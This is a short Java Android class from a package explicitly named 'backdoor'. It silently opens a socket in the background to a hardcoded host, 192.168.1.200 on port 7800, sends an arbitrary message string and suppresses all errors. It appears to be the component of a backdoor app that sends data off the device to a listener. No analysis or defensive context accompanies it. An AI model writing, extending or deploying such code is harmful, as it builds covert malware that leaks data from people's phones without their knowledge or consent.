package gasa_soft.ga.backdoor;

import android.os.AsyncTask;

import java.io.DataOutput;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class MessageSender extends AsyncTask<String,Void,Void> {
    Socket s;
    DataOutput dos;
    PrintWriter pw;
    @Override
    protected Void doInBackground(String... params) {
             String message=params[0];
        try {
            s=new Socket("192.168.1.200",7800);
            pw=new PrintWriter(s.getOutputStream());
            pw.write(message);
            pw.flush();
            pw.close();
            s.close();
        } catch (IOException e) {

        }
        return null;}
}